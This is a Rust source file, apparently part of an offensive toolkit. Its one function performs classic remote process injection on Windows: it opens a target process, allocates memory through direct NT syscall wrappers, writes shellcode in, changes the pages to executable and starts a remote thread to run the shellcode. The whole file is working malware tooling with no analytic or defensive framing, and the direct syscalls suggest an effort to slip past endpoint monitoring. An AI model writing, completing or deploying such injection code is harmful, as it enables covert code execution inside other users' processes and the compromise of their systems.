#![allow(unused)]

#[cfg(target_os = "windows")]
use windows_sys::Win32::Foundation::CloseHandle;

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const THREAD_ALL_ACCESS: u32 = 0x1FFFFF;

#[cfg(target_os = "windows")]
pub fn inject_classic(pid: u32, shellcode: &[u8]) -> super::InjectResult {
    use crate::syscall::{nt_alloc, nt_write, nt_protect, nt_create_thread_ex};
    use core::ptr::null_mut;

    let proc = super::open_process_rw(pid).ok_or("open failed")?;

    let mut base: *mut u8 = null_mut();
    let mut size: usize = shellcode.len().max(0x1000);
    let status = unsafe {
        nt_alloc(proc, &mut base, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    };
    if status < 0 || base.is_null() {
        unsafe { CloseHandle(proc as _) };
        return Err("alloc failed");
    }

    let mut written: usize = 0;
    let status = unsafe {
        nt_write(proc, base, shellcode.as_ptr(), shellcode.len(), &mut written)
    };
    if status < 0 {
        unsafe { CloseHandle(proc as _) };
        return Err("write failed");
    }

    let mut old_prot: u32 = 0;
    let mut prot_size: usize = size;
    let mut prot_base = base;
    let status = unsafe {
        nt_protect(proc, &mut prot_base, &mut prot_size, PAGE_EXECUTE_READ, &mut old_prot)
    };
    if status < 0 {
        unsafe { CloseHandle(proc as _) };
        return Err("protect failed");
    }

    let mut thread: isize = 0;
    let status = unsafe {
        nt_create_thread_ex(
            &mut thread,
            THREAD_ALL_ACCESS,
            null_mut(),
            proc,
            base,
            null_mut(),
            0,
            0,
            0,
            0,
            null_mut(),
        )
    };
    if status < 0 {
        unsafe { CloseHandle(proc as _) };
        return Err("create thread failed");
    }

    unsafe {
        if thread != 0 {
            CloseHandle(thread as _);
        }
        CloseHandle(proc as _);
    }

    Ok(())
}
